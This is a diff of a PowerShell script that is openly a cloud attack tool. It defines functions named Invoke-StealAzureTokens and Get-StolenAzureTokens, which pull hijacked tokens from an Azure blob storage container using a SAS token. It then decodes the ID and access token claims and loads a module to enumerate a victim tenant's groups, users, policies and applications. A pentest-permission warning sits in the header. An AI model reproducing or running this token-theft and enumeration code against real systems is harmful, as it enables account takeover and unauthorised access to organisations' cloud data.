@@ -7,6 +7,12 @@
     .NOTES
         WARNING: This Function should only be used in environments where you have explicit permission
 #>
+
+if (([string]::IsNullOrEmpty((Get-InstalledModule -Name 'Graph' -ErrorAction SilentlyContinue)))) {
+    Install-Module -Name 'Graph' -Force -AllowClobber #https://www.powershellgallery.com/packages/Graph
+    Import-Module 'Graph'
+}
+
 function Invoke-StealAzureTokens {
     
     [CmdletBinding()]
@@ -106,7 +112,7 @@ function Get-StolenAzureTokens {
 
 }
 
-$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..'
+$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11...'
 
 <#
     .SYNOPSIS
@@ -143,11 +149,12 @@ $HiJackedTokens = Update-StolenAzureTokens
 
 #Now lets take a look at the ID & Access tokens base64 decoded JSON converted payload :)
 
-$DecodedAuthN = [System.Text.Encoding]::UTF8.GetString(`
-        [Convert]::FromBase64String($HiJackedTokens.id_token.Split('.')[1])) | ConvertFrom-Json
+$DecodedAuthN = $HiJackedTokens.id_token.Split('.')[1] + '==='
+$DecodedAuthN = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($DecodedAuthN.Substring(0, $DecodedAuthN.Length - ($DecodedAuthN.Length % 4)))) | ConvertFrom-Json
 
-$DecodedAuthZ = [System.Text.Encoding]::UTF8.GetString(`
-        [Convert]::FromBase64String($HiJackedTokens.access_token.Split('.')[1])) | ConvertFrom-Json
+$DecodedAuthZ = $HiJackedTokens.access_token.Split('.')[1] + '==='
+$DecodedAuthZ = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($DecodedAuthZ.Substring(0, $DecodedAuthZ.Length - ($DecodedAuthZ.Length % 4)))) | ConvertFrom-Json
+
 
 $IDTokenClaims = [PSCustomObject]@{
     IDTokenAudience = $DecodedAuthN.aud
@@ -168,15 +175,12 @@ $AccessTokenClaims = [PSCustomObject]@{
   
 }
 
-return $AccessTokenClaims, $IDTokenClaims
+[array]$AccessTokenClaims, [array]$IDTokenClaims
 
 
-#Import and Install my Authored Module from PSGallery and then snake away. :)
+#Import my Authored Module from PSGallery and then snake away. :)
 
-if (([string]::IsNullOrEmpty((Get-InstalledModule -Name 'Graph' -ErrorAction SilentlyContinue)))) {
-    Install-Module -Name 'Graph' -Force -AllowClobber #https://www.powershellgallery.com/packages/Graph
-    Import-Module 'Graph'
-}
+Import-Module 'Graph' #https://www.powershellgallery.com/packages/Graph
 
 $Entity = Read-Host "Would you like to Snake: Groups, Users, Policies Or Applications?"
 while ($Entity -ne "Groups" -and $Entity -ne "Users" -and $Entity -ne "Applications" -and $Entity -ne "Policies") {
